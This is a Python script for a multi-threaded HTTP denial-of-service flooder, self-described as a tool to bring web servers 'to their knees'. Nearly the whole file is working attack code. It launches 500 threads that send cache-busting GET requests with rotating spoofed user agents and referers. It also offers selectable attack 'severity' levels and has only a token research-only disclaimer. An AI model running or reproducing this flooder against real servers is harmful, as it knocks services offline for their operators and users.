import requests
import threading
import sys
import random
import time
import re

# Global variables
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
initial_requests = 0
increment = 0
current_requests = 0

def display_ascii_art():
    ascii_art = """
    
   _____      _                  _____                 _             
  / ____|    | |                / ____|               | |            
 | |    _   _| |__   ___ _ __  | (___  _ __   ___  ___| |_ ___  _ __ 
 | |   | | | | '_ \ / _ \ '__|  \___ \| '_ \ / _ \/ __| __/ _ \| '__|
 | |___| |_| | |_) |  __/ |     ____) | |_) |  __/ (__| || (_) | |   
  \_____\__, |_.__/ \___|_|    |_____/| .__/ \___|\___|\__\___/|_|   
         __/ |                        | |                            
        |___/                         |_|                            

    
    # ----------------------------------------------------------------------------------------------
    # HUMANGOUS - HTTP Unbearable Load King
    #
    # This tool is a DoS tool meant to put heavy load on HTTP servers in order to bring them
    # to their knees by exhausting the resource pool. It is meant for research purposes only,
    # and any malicious usage of this tool is prohibited.
    #
    # Author: Ajay, Version 1.0
    # ----------------------------------------------------------------------------------------------
    """
    print(ascii_art)

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ])
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers.extend([
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://' + host + '/'
    ])
    return headers_referers

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def usage():
    print('---------------------------------------------------')
    print('USAGE: python humangous.py <url> [safe]')
    print('You can add "safe" after the URL to auto-shutdown after DoS')
    print('---------------------------------------------------')

def httpcall(url):
    useragent_list()
    referer_list()
    param_joiner = "&" if "?" in url else "?"
    request = requests.Request(
        method='GET',
        url=url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)),
        headers={
            'User-Agent': random.choice(headers_useragents),
            'Cache-Control': 'no-cache',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
            'Keep-Alive': str(random.randint(110, 120)),
            'Connection': 'keep-alive',
            'Host': host
        }
    ).prepare()
    
    try:
        response = requests.Session().send(request)
        if response.status_code == 500:
            set_flag(1)
            print('Response Code 500')
        else:
            inc_counter()
            return response.status_code
    except requests.exceptions.RequestException:
        pass

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                if request_counter >= current_requests:
                    break
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        global current_requests
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter) and (previous != request_counter):
                print(f"{request_counter} Requests Sent")
                previous = request_counter
                if request_counter >= current_requests:
                    current_requests += increment
                    print(f"Request count increased to {current_requests}")

            time.sleep(1)  # Delay for checking the status

        if flag == 2:
            print("\n-- HUMANGOUS Attack Finished --")
            print(f"Total Requests Sent: {request_counter}")
            print(f"Estimated Impact: This many requests could potentially overwhelm the server depending on its capacity.")

def choose_options():
    global initial_requests
    global increment
    global current_requests

    print("Select the severity of the attack:")
    print("1. Mild (Starts with 500 requests and increases by 250)")
    print("2. Moderate (Starts with 1000 requests and increases by 500)")
    print("3. Severe (Starts with 1500 requests and increases by 750)")
    print("4. Extreme (Starts with 2000 requests and increases by 1000)")
    choice = input("Enter your choice (1/2/3/4): ").strip()

    if choice == '1':
        initial_requests = 500
        increment = 250
    elif choice == '2':
        initial_requests = 1000
        increment = 500
    elif choice == '3':
        initial_requests = 1500
        increment = 750
    elif choice == '4':
        initial_requests = 2000
        increment = 1000
    else:
        print("Invalid choice. Defaulting to Mild severity.")
        initial_requests = 500
        increment = 250

    current_requests = initial_requests

if __name__ == "__main__":
    display_ascii_art()  # Display ASCII art at the top

    if len(sys.argv) < 2:
        usage()
        sys.exit()
    else:
        if sys.argv[1] == "help":
            usage()
            sys.exit()
        else:
            choose_options()  # Get user preferences

            print("-- HUMANGOUS Attack Started --")
            if len(sys.argv) == 3:
                if sys.argv[2] == "safe":
                    set_safe()
            url = sys.argv[1]
            if url.count("/") == 2:
                url = url + "/"
            m = re.search('(https?://)?([^/]*)/?.*', url)
            host = m.group(2)
            for _ in range(500):  # Start with 500 threads
                t = HTTPThread()
                t.start()
            t = MonitorThread()
            t.start()

